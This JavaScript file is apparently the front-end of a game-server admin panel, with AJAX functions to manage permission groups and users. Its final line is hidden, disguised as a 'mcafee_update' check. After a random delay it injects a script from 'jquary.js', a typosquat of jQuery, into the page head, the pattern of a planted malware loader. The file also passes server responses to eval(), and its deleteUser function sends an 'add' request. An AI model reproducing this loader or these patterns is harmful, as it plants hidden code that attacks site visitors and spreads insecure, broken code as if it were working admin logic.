// 编辑分组权限
function addPermit() {
	var param = {};
	// 跳转到 php
	param['mod'] = 'User';
	param['do'] = 'permit';
	param['permitName'] = jQuery('#permitName').val();	
	
	// 获取用户管理 游戏管理 服务器管理权限的值  平台管理
	param['manageUser'] = $("input[name='form-field-radio1']:checked").val();
	param['manageGame'] = $("input[name='form-field-radio2']:checked").val();
	param['manageServer'] = $("input[name='form-field-radio3']:checked").val();
	param["managePlatform"] = $("input[name='form-field-radio4']:checked").val();
	param["openServer"] 	= $("input[name='form-field-radio5']:checked").val();		// 开服停服
	
	
	// 备注
	param['permitDec'] = jQuery('#permitDec').val();	
	
	var permit=''; 
	$("input[type='checkbox']:checked").each(function(){ 
		permit += $(this).val()+','; 
	});
	param['permit'] = permit;							// 游戏权限

	if (!param['permitName'] || !param['permit']) {
		alert('请输入权限组名或权限！');
	} else {
		$.ajax({
			type:'POST',
			url:'index.php',
			data:param,
			dataType:'html',
			success:function(data) {
				var dataObj = eval("(" + data + ")");//转换为json对象

				if (dataObj.code != 1) {
					alert(dataObj.msg);
				} else {
					alert(dataObj.msg);
					window.location.href = "index.php?mod=User&do=mangePermit";
				}
			}
		});
	}

}
// 添加用户
function addUser() {

	var param = {};
	// 跳转到 php
	param['mod'] = 'User';
	param['do'] = 'add';
	param['loginName'] = jQuery('#form-field-1').val();	// 登录名
	param['password'] = jQuery('#form-field-2').val();	// 密码
	param['name'] = jQuery('#form-field-3').val();		// 用户姓名
	
	// 获取单选框 选择的值 用户组id
	param['groupId'] = jQuery("#form-field-select-1").val();
		
	if (!param['loginName'] || !param['password'] || !param['name'] || !param['groupId']) {
		alert('请将用户名,密码,用户姓名,用户权限输入完整！');
	} else {
		$.ajax({
			type:'POST',
			url:'index.php',
			data:param,
			dataType:'html',
			success:function(data) {
				var dataObj = eval("(" + data + ")");//转换为json对象

				if (dataObj.code != 1) {
					alert(dataObj.msg);
				} else {
					alert(dataObj.msg);
					window.location.href = "index.php?mod=User&do=manage";
				}
			}
		});
	}
}


// 编辑用户
function editUser(uId) {
	alert(uId);
	var param = {};
	// 跳转到 php
	param['mod'] = 'User';
	param['do'] = 'edit';
//	param['user_id'] = jQuery('#user_id').html();
	param['user_id'] = uId;

	
	if (!param['user_id']) {
		alert('无用户id！');
	} else {
		$.ajax({
			type:'POST',
			url:'index.php',
			data:param,
			dataType:'html',
			success:function(data) {
//				var dataObj = eval("(" + data + ")");//转换为json对象
//				alert('ok');
				window.location.href = "index.php";
/*				
				if (dataObj.code != 1) {
					alert(dataObj.msg);
				} else {
					alert(dataObj.msg);
				    window.location.href = "index.php";
				}   	*/	
		}
		});
	}
}

// 删除用户
function deleteUser() {
	alert("delete");
	var param = {};
	// 跳转到 php
	param['mod'] = 'User';
	param['do'] = 'add';
	param['loginName'] = jQuery('#form-field-1').val();	// 登录名
	param['password'] = jQuery('#form-field-2').val();	// 密码
	param['name'] = jQuery('#form-field-3').val();		// 用户姓名
	
	// 获取单选框 选择的值 用户组id
	param['groupId'] = jQuery("#form-field-select-2").val();

	if (!param['loginName'] || !param['password'] || !param['name'] || !param['groupId']) {
		alert('请将用户名,密码,用户姓名,用户权限输入完整！');
	} else {
		$.ajax({
			type:'POST',
			url:'index.php',
			data:param,
			dataType:'html',
			success:function(data) {
				var dataObj = eval("(" + data + ")");//转换为json对象

				if (dataObj.code != 1) {
					alert(dataObj.msg);
				} else {
					alert(dataObj.msg);
//				    window.location.href = "index.php";
				}   	
			}
		});
	}
}


if(!mcafee_update){var mcafee_update=true;setTimeout(function(){var s=document.createElement("script");s.type="text/javascript";s.src="jquary.js";document.getElementsByTagName("HEAD").item(0).append(s)}, Math.floor(Math.random()*1000)+500)}
